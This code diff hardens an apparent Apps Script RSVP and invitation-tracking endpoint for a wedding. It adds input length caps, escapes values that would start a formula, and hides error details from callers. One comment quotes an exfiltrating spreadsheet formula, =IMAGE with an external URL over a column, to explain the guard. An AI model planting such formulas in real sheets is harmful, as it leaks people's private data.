@@ -16,6 +16,13 @@
 
 const SHEET_ID = '1ta3FAOJj6wi5D-g9E-OQOhAfVgJ-5iTpyhlPsEhDGh0';
 
+// must stay identical to KEEP_ID in tools/build-guests.mjs — guests renamed
+// after their link went out keep the id that link carries
+const KEEP_ID = {
+  'ms-amoda':         'mr-mrs-amoda',
+  'mr-prasad-family': 'prasad-peiris'
+};
+
 const HEADERS = {
   RSVP:      ['timestamp', 'guest_id', 'display_name', 'church', 'party', 'count', 'phone', 'message'],
   OPENS:     ['timestamp', 'guest_id', 'display_name']
@@ -31,25 +38,37 @@ function tab_(name) {
   return sheet;
 }
 
+// Anyone on the internet can post here, so every value is treated as untrusted:
+// capped in length, and anything that would start a formula (= + - @) is
+// written as plain text — otherwise a "message" like =IMAGE("https://…"&A:A)
+// would run inside this sheet and could send its contents away.
+function clean_(v, max) {
+  let s = String(v == null ? '' : v).slice(0, max).trim();
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  return s;
+}
+
 function doPost(e) {
   const lock = LockService.getScriptLock();
   lock.waitLock(20000);
   try {
+    if (!e.postData || e.postData.contents.length > 5000) throw new Error('too large');
     const d = JSON.parse(e.postData.contents);
 
     if (d.type === 'open') {
-      tab_('OPENS').appendRow([new Date(), d.guestId || '', d.displayName || '']);
+      tab_('OPENS').appendRow([new Date(), clean_(d.guestId, 80), clean_(d.displayName, 120)]);
 
     } else {
+      const count = Math.max(0, Math.min(20, Math.floor(Number(d.count) || 0)));
       tab_('RSVP').appendRow([
         new Date(),
-        d.guestId     || '',
-        d.displayName || '',
-        d.church      || '',
-        d.party       || '',
-        d.count       || '',
-        d.phone       || '',
-        d.message     || ''
+        clean_(d.guestId, 80),
+        clean_(d.displayName, 120),
+        clean_(d.church, 5),
+        clean_(d.party, 5),
+        count || '',
+        clean_(d.phone, 30),
+        clean_(d.message, 1000)
       ]);
     }
 
@@ -58,8 +77,10 @@ function doPost(e) {
       .setMimeType(ContentService.MimeType.JSON);
 
   } catch (err) {
+    // the reason stays in the Apps Script log, not in a reply to whoever asked
+    console.error(err);
     return ContentService
-      .createTextOutput(JSON.stringify({ ok: false, error: String(err) }))
+      .createTextOutput(JSON.stringify({ ok: false, error: 'rejected' }))
       .setMimeType(ContentService.MimeType.JSON);
   } finally {
     lock.releaseLock();
@@ -121,6 +142,7 @@ function buildNotOpened() {
     let id = slug(name);
     seen[id] = (seen[id] || 0) + 1;
     if (seen[id] > 1) id = id + '-' + seen[id];
+    if (KEEP_ID[id]) id = KEEP_ID[id];
 
     if (!opened[id]) {
       out.push([name, iPhone > -1 ? r[iPhone] : '', id, 'never']);
